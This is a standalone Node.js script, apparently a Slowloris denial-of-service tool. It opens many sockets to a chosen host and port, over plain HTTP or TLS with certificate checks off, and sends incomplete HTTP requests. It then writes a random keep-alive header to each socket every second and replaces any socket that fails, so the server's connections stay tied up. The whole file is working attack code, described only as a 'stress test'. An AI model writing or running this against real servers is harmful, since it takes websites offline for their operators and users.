const net = require("net");
const tls = require("tls");
const yargs = require("yargs");
const { userAgents } = require("./UA-list")

function sendHeader(socket, name, value) {
  socket.write(`${name}: ${value}\r\n`);
}

let beforeReject = false;

function createSocket(host, port, useHttps) {
  const socket = useHttps
    ? tls.connect(port, host, { rejectUnauthorized: false })
    : net.createConnection(port, host);
  socket.setTimeout(4000);

  socket.on("error", (err) => {
    if (beforeReject) {
      return;
    }
    console.error(`Connection was rejected.`);
    beforeReject = true;
    setTimeout(() => {
      beforeReject = false;
    }, 100)
  });

  socket.write(`GET /?${Math.floor(Math.random() * 2000)} HTTP/1.1\r\n`);
  const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
  sendHeader(socket, "User-Agent", userAgent);
  sendHeader(socket, "Accept-language", "en-US,en;q=0.5");

  return socket;
}

function slowLorisAttack(host, port, sockets, useHttps, sleepTime) {
  console.log("⚡ slowLoris.js");
  const socketList = [];
  let socketCount = sockets;

  for (let i = 0; i < socketCount; i++) {
    const socket = createSocket(host, port, useHttps);
    socketList.push(socket);
  }

  setInterval(() => {
    console.log("Sending keep-alive headers...");
    console.log(`Socket count: ${socketList.length}`);

    socketList.forEach((socket, index) => {
      socket.write(`X-a: ${Math.floor(Math.random() * 5000)}\r\n`, (err) => {
        if (err) {
          socketList.splice(index, 1);
          socket.destroy();
        }
      });
    });

    const diff = socketCount - socketList.length;
    if (diff <= 0) return;

    console.log(`Creating ${diff} new sockets...`);
    for (let i = 0; i < diff; i++) {
      const socket = createSocket(host, port, useHttps);
      if (socket) {
        socketList.push(socket);
      }
    }
  }, 1000);

  setInterval(() => {
    console.log("Sleeping for 15 seconds");
  }, sleepTime * 1000);
}

const argv = yargs
  .usage("Usage: $0 [options]")
  .option("host", {
    describe: "Host to perform the stress test on",
    demandOption: true,
    type: "string",
  })
  .option("port", {
    describe: "Port of the web server (default: 80)",
    type: "number",
    default: 80,
  })
  .option("sockets", {
    describe: "Number of sockets to use in the test (default: 150)",
    type: "number",
    default: 150,
  })
  .option("verbose", {
    describe: "Increases logging",
    type: "boolean",
  })
  .option("randuseragent", {
    describe: "Randomizes user agents with each request",
    type: "boolean",
  })
  .option("useproxy", {
    describe: "Use a SOCKS5 proxy for connecting",
    type: "boolean",
  })
  .option("https", {
    describe: "Use HTTPS for the requests",
    type: "boolean",
  })
  .option("sleeptime", {
    describe: "Time to sleep between each header sent (default: 15)",
    type: "number",
    default: 15,
  }).argv;

slowLorisAttack(argv.host, argv.port, argv.sockets, argv.https, argv.sleeptime);
